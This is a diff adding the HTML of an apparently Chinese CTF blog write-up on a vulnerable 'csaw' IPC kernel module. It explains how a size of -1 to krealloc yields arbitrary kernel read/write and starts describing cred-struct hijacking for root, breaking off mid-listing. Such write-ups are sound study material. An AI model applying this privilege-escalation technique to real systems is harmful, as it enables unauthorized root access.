@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="第五次学习kernel，寒假也接近了尾声。回想一下寒假学了什么，主要是复习了一下堆中不熟悉的IO_FILE攻击、建立了这个博客，pwnable.tw上刷了4道题，学习了kernel，出了一道题，打了一次dicectf。还是感觉时间好快。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel-5-bypass_smep1">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/02/15/kernel-5-bypass-smep1/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="第五次学习kernel，寒假也接近了尾声。回想一下寒假学了什么，主要是复习了一下堆中不熟悉的IO_FILE攻击、建立了这个博客，pwnable.tw上刷了4道题，学习了kernel，出了一道题，打了一次dicectf。还是感觉时间好快。">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220216122608119.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220216130310607.png">
+<meta property="article:published_time" content="2022-02-15T08:26:49.000Z">
+<meta property="article:modified_time" content="2022-02-16T06:32:02.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220216122608119.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>kernel-5-bypass_smep1 | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-kernel-5-bypass-smep1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/02/15/kernel-5-bypass-smep1/" class="article-date">
+      <time datetime="2022-02-15T08:26:49.000Z" itemprop="datePublished">2022-02-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      kernel-5-bypass_smep1
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/basic/">basic</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>第五次学习kernel，寒假也接近了尾声。回想一下寒假学了什么，主要是复习了一下堆中不熟悉的IO_FILE攻击、建立了这个博客，pwnable.tw上刷了4道题，学习了kernel，出了一道题，打了一次dicectf。还是感觉时间好快。</p>
+<span id="more"></span>
+
+<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./built.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-s \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
+
+<p>开启了smep保护。内核不可执行用户空间代码。</p>
+<h1 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h1><p>这道内核题目给了源码，一看有400行。我们先使用头来逆向。（想起来被mit6.828支配的恐惧）</p>
+<p>回想一下JOS中的IPC通信，主要是两个进程各有一个监听者和一个发送者，不断循环等待接收数据。大致思路有了，我们从<code>file_operation</code>开始入手。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">csaw_fops</span> =</span> &#123;</span><br><span class="line">    owner:          THIS_MODULE,</span><br><span class="line">    open:           csaw_open,</span><br><span class="line">    release:        csaw_release,</span><br><span class="line">    unlocked_ioctl: csaw_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="open函数"><a href="#open函数" class="headerlink" title="open函数"></a>open函数</h2><p>可以看到一共有三种操作方式，open,release和ioctl。最后一种应该是为了提供更多操作而单独列出来的。首先看<code>open</code>函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">csaw_open</span> <span class="params">( <span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_state</span> *<span class="title">state</span>;</span></span><br><span class="line">    state = kzalloc(<span class="keyword">sizeof</span>(*state), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( state == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    mutex_init(&amp;state-&gt;lock);</span><br><span class="line">    file-&gt;private_data = state;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个操作是将<code>file</code>类型文件的<code>private_data</code>改成<code>state</code>。而<code>state</code>是我们通过kazlloc申请出来的一段内存。file结构体是什么，交叉引用得不到。可能是源码中，同级目录下没有导致的。我们暂且不管，认为他就是普通的文件。</p>
+<h2 id="release函数"><a href="#release函数" class="headerlink" title="release函数"></a>release函数</h2><p>接下来看<code>release</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">csaw_release</span> <span class="params">( <span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_state</span> *<span class="title">state</span> =</span> file-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> ( state-&gt;channel )</span><br><span class="line">        ipc_channel_put(state, state-&gt;channel);</span><br><span class="line">    kfree(state);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用了<code>ipc_channel_put</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ipc_channel_put</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="keyword">struct</span> ipc_channel *channel )</span></span><br><span class="line">&#123;</span><br><span class="line">    kref_put(&amp;channel-&gt;ref, ipc_channel_destroy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ipc_channel_destroy如下</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ipc_channel_destroy</span> <span class="params">( <span class="keyword">struct</span> kref *ref )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span> =</span> container_of(ref, <span class="keyword">struct</span> ipc_channel, ref);</span><br><span class="line"></span><br><span class="line">    idr_remove(&amp;ipc_idr, channel-&gt;id);</span><br><span class="line"></span><br><span class="line">    kfree(channel-&gt;data);</span><br><span class="line">    kfree(channel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看起来像是释放空间，这里没有洞。</p>
+<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>接下来是<code>ioctl</code>函数。函数较长就不列出了。主要写一下我对这几个操作函数的理解。channel相当于一种类似管道的数据缓冲区。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSAW_ALLOC_CHANNEL</span></span><br><span class="line">主要是调用alloc_new_ipc_channel分配一个channel以及channelID.同时如果此时copy_to_user成功了就说明出错(不清楚这里的作用，是为了验证没有数据残留吗？)</span><br><span class="line"><span class="comment">// CSAW_OPEN_CHANNEL</span></span><br><span class="line">最主要是将state-&gt;channel设置为当前根据id选择的channel</span><br><span class="line"><span class="comment">// CSAW_GROW_CHANNEL\CSAW_SHRINK_CHANNEL</span></span><br><span class="line">调用内核<span class="built_in">realloc</span>调整channel大小</span><br><span class="line"><span class="comment">// CSAW_READ_CHANNEL\CSAW_WRITE_CHANNEL</span></span><br><span class="line">将用户数据读入challel或者将channel数据写回给用户</span><br><span class="line"><span class="comment">// CSAW_SEEK_CHANNEL</span></span><br><span class="line">给出当前操作的channel特定位置的指针&lt;类似fseek,包含前向偏移和后向偏移&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>这里需要对内核malloc机制有所了解才能做出来。漏洞在<code>realloc</code>函数中。如下图</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">realloc_ipc_channel</span> <span class="params">( <span class="keyword">struct</span> ipc_state *state, <span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">int</span> grow )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="type">size_t</span> new_size;</span><br><span class="line">    <span class="type">char</span> *new_data;</span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )  <span class="comment">// 定义的出错条件</span></span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述函数调用<code>krealloc</code>对请求进行重新分配大小。LINUX内核中<code>krealloc</code>实现如下(mm/slab_common.c)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * krealloc - reallocate memory. The contents will remain unchanged.</span></span><br><span class="line"><span class="comment">     * @p: object to reallocate memory for.</span></span><br><span class="line"><span class="comment">     * @new_size: how many bytes of memory are required.</span></span><br><span class="line"><span class="comment">     * @flags: the type of memory to allocate.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The contents of the object pointed to are preserved up to the</span></span><br><span class="line"><span class="comment">     * lesser of the new and old sizes.  If @p is %NULL, krealloc()</span></span><br><span class="line"><span class="comment">     * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a</span></span><br><span class="line"><span class="comment">     * %NULL pointer, the object pointed to is freed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">krealloc</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *p, <span class="type">size_t</span> new_size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ret;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">        kfree(p);</span><br><span class="line">        <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = __do_krealloc(p, new_size, flags);</span><br><span class="line">    <span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">        kfree(p);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// 对于ZERO_SIZE_PTR，解释如下  (include/linux/slab.h)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZERO_SIZE_PTR will be returned for zero sized kmalloc requests.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dereferencing ZERO_SIZE_PTR will lead to a distinct access fault.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ZERO_SIZE_PTR can be passed to kfree though in the same way that NULL can.</span></span><br><span class="line"><span class="comment"> * Both make kfree a no-op.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZERO_SIZE_PTR ((void *)16</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面看到，当new_size为0时，原先指针将被free掉，并返回一个可以被free但是不能被解引用的返回值<code>((void *)16</code>。但是注意到IPC中定义的出错条件是realloc返回值为NULL，不是这里的16。<strong>如果我们传入size为-1，首先由于size_t是无符号类型，将被解释为0xfffff…ffff，其次，这里将size+1之后realloc将返回一个非NULL的指针，说明可以分配成功。于是我们拿到了一个0xfffff…ffff的缓冲区，也就是任意地址读写的权限</strong></p>
+<p>也就是说，我们现在拥有了内核地址空间任意读写的条件。那么该怎么利用呢？这里参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3204">链接</a>的三种方法，进行逐一的复现。</p>
+<h1 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h1><h2 id="方法一：劫持cred结构体"><a href="#方法一：劫持cred结构体" class="headerlink" title="方法一：劫持cred结构体"></a>方法一：劫持cred结构体</h2><p>前面几篇文章中也能看出来，cred结构体中定义了进程的权限。如果能够设置uid,gid等全为0，也就直接获得了root权限。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> 